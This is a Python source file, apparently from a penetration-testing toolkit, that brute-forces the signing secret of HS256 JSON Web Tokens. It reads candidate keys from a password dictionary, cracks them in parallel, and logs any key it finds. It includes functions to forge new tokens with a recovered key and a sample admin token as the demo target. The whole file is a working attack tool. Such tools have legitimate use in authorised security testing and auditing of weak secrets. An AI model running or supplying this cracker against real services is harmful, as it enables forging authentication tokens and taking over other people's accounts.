# -*- coding: utf-8 -*-
import jwt
import json
import hashlib
import hmac
import base64
import time
from lib.core.w_processPool import MyProcessPool
from lib.file.file_Class import readFile,writeFile
from conf.conf import base_root

#多进程爆破jwt hs256所采用的密码
def weakPwdCrack_jwt(token,code='ascii',key_list=None,resultFile=None):
    if key_list == None:
        key_list = readFile('{}payload/dict/passwd_1w.txt'.format(base_root))
    if resultFile == None:
        resultFile = '{}result/jwt_{}.txt'.format(base_root,time.time())

    myProcess = MyProcessPool(jwtCrack, key_list,other_args=token)
    myProcess.start()
    writeFile(resultFile, '[FOUND] key:{}'.format(myProcess.result))

# 猜测jwt hs256的密码，如果成功，则返回密码，不成功返回False
def jwtCrack(key, token, code='ascii'):
    token_split = token.split('.')
    header_1 = token_split[0]
    header_1 += len(header_1)%4*'='
    headers_dict = json.loads(base64.b64decode(header_1))
    if headers_dict['alg'] != 'HS256':
        raise Exception('algorithm is not HS256 !')
        exit(0)
    sign = getJWTSign(key, token_split[0], token_split[1])
    if sign == token_split[2]:
        # print('key:{},sign:{} == {}'.format(key,sign,token_split[2]))
        print('[FOUND] key:{}'.format(key))
        return key
    else:
        pass
        # print('key:{},sign:{} != {}'.format(key, sign, token_split[2]))
        # print('{} is wrong !'.format(key))

#生成jwt
def encodeJWT(key,payload,headers=None,code='ascii'):
    if headers == None:
        headers = {"typ": "JWT", "alg": "HS256"}
    return jwt.encode(payload,key,algorithm="HS256",headers=headers).decode(code)

#解密jwt
def decodeJWT(key,token):
    data = None
    try:
        data = jwt.decode(token,key,algorithms=['HS256'])
    except Exception as e:
        print(e)
    return data

#把数据和key组合进行hs256加密
def HMACSHA256(key,data,code='ascii'):
    try:
        signature = base64.b64encode(hmac.new(key.encode(code),data.encode(code), digestmod=hashlib.sha256).digest())
        return signature.decode(code)
    except:
        pass
        return 'wrong'

#把jwt的第1部分和第2部分组合，得到第3部分的签名
def getJWTSign(key,part1,part2,code='ascii'):
    sign = HMACSHA256(key,part1+'.'+part2,code)
    return sign.replace('/','_').replace('=','').replace('+','-')

if __name__ == '__main__':
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImp0aSI6IjExNDc5YmQzLWI3ZmMtNGZhOS04ZTExLWUzZDhmYTcyZWU2ZCIsImlhdCI6MTU5MzUwMDU3NCwiZXhwIjoxNTkzNTA0MTc0fQ.mKmMrmUqKiBiaSOeJKQK3id_28-LtrlFxC2ZVMnJmPM'
    weakPwdCrack_jwt(token)
    # print(decodeJWT('secret',token))
    # print(encodeJWT('secret',{'sub': '1234567890', 'name': 'John Doe', 'admin': True, 'jti': '11479bd3-b7fc-4fa9-8e11-e3d8fa72ee6d', 'iat': 1593500574, 'exp': 1593504174}))
